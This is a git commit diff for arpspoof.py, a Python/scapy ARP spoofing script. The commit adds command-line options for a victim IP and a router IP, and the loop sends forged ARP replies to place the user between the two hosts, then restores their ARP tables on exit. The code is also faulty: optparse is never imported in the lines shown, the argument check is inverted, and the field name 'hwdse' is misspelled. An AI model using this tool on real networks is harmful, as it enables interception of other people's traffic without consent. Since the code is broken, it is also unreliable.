d923a162f60b0d5d47e6561a35f5110e1cc433eb
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-22 05:26:53 -0400

    Added User Input via Command line args

--- arpspoof.py
+++ arpspoof.py
@@ -3,6 +3,16 @@ import scapy.all as scapy
 import time
 import sys
 
+def get_args():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_ip", help="IP of Target/Victim")
+    parser.add_option("-s", "--spoof", dest="spoof_ip", help="IP of Router/Receiver")
+    (value, args) = parser.parse_args()
+    if not value.target_ip or value.spoof_ip:
+        parser.error("[-] ERROR Missing argument, use --help or more info")
+    else:
+        return value
+
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -19,17 +29,18 @@ def arp_restore(dest_ip, src_ip):
     arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdse=dest_addr, psrc=src_ip, hwsrc=src_addr)
     scapy.send(arp_packet, verbose=False, count=4)
 
+value = get_args()
 packet_count = 0
 try:
     while True:
-        arpsend(victim_ip, router_ip)
-        arpsend(router_ip, victim_ip)
+        arpsend(value.target_ip, value.spoof_ip)
+        arpsend(value.spoof_ip, value.target_ip)
         packet_count += 2
         print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("[-] Detected CTRL + C....Restoring ARP Table, Please wait....")
-    arp_restore(victim_ip, router_ip)
-    arp_restore(router_ip, victim_ip)
+    arp_restore(value.target_ip, value.spoof_ip)
+    arp_restore(value.spoof_ip, value.target_ip)
     print("[+] ARP Spoofing Stopped.")
